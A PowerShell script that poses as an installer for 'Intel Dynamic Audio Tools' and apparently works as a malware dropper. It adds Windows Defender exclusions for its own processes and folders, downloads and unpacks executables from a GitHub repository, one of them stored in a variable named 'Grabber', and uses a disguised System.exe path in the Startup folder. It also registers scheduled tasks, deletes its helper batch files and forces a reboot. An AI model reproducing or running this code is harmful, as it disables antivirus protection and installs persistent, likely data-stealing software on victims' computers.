# PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Out-Null"

$TargetPath    = "C:\ProgramData\Intel\Audio"
$TargetZip     = "$TargetPath\audiotools.zip"
$TargetFile    = "$TargetPath\Intel Dynamic Audio Tools.exe"
$TargetGrabber = "$TargetPath\Intel_Dynamic_Notification_Service.exe"
$TargetSystem  = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\System.exe"
$TargetABat = "$TargetPath\Register_Audio_Tools.bat"
$TargetNBat = "$TargetPath\Register_Notification_Service.bat"

Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Tools.exe' -Force
Add-MpPreference -ExclusionProcess 'Intel_Dynamic_Notification_Service.exe' -Force
Add-MpPreference -ExclusionProcess 'System.exe' -Force
Add-MpPreference -ExclusionPath "$TargetPath" -Force
Add-MpPreference -ExclusionPath "$TargetFile" -Force
Add-MpPreference -ExclusionPath "$TargetGrabber" -Force
Add-MpPreference -ExclusionPath "$TargetSystem" -Force
Write-Output "`n*****`nAdding Exclusions`n*****`n"

if (Get-Process -Name "Intel Dynamic Audio Tools" -ErrorAction SilentlyContinue) {
  Stop-Process -Name "Intel Dynamic Audio Tools" -Force
  Write-Output "`n*****`nStopped Process Intel Dynamic Audio Tools`n*****`n"
} 

if (Test-Path "$TargetPath") {
  Write-Output "`n*****`nClean Directory $TargetPath"
  Remove-Item -Recurse -Force -Path "$TargetPath"
  New-Item -Path "$TargetPath" -ItemType Directory -Force
  Write-Output "Created Directory $TargetPath`n*****`n"
} else {
  Write-Output "`n*****`nCreated Directory $TargetPath"
  New-Item -Path "$TargetPath" -ItemType Directory -Force
  Write-Output "*****`n"
}

  Write-Output "`n*****`nDownloading $TargetZip"
  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudio/raw/refs/heads/main/intelaudio.zip" -OutFile "$TargetZip"
  Write-Output "`nDecompressing $TargetZip`n"
  Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
  Get-ChildItem -Path $TargetPath -Name
  Remove-Item -Path "$TargetZip"
  Write-Output "`nRemoved $TargetZip`n*****`n"

if (Get-ScheduledTask -TaskName "Intel Dynamic Audio Tools" -ErrorAction SilentlyContinue) {
  Write-Output "`n*****`nRemoved Task Intel Dynamic Audio Tools"
  Invoke-Expression -Command "schtasks.exe /delete /TN 'Apps\Intel_Dynamic_Audio_Tools' /f"
  Write-Output "*****`n`n*****`nRegistering Task Intel Dynamic Audio Tools" 
  & $TargetABat
  Write-Output "*****`n"
} else {
  Write-Output "`n*****`nRegistering Task Intel Dynamic Audio Tools"
  & $TargetABat
  Write-Output "*****`n"
}

if (Get-ScheduledTask -TaskName "Intel Dynamic Notification Service" -ErrorAction SilentlyContinue) {
  Write-Output "`n*****`nRemoved Task Intel Dynamic Notication Service"
  Invoke-Expression -Command "schtasks.exe /delete /TN 'Apps\Intel_Dynamic_Notification_Service' /f"
  Write-Output "*****`n`n*****`nRegistering Task Intel Dynamic Audio Tools" 
  & $TargetNBat
  Write-Output "*****`n"
} else {
  Write-Output "`n*****`nRegistering Task Intel Dynamic Audio Tools"
  & $TargetNBat
  Write-Output "*****`n"
}

Remove-Item -Path $TargetPath\Register_Audio_Tools.bat -Force
Remove-Item -Path $TargetPath\Register_Notification_Service.bat -Force

Write-Output "`n*****`nInstallation Complete`n*****`n"
Write-Output "`n*****`nRestarting Computer`n*****`n"
Restart-Computer -Force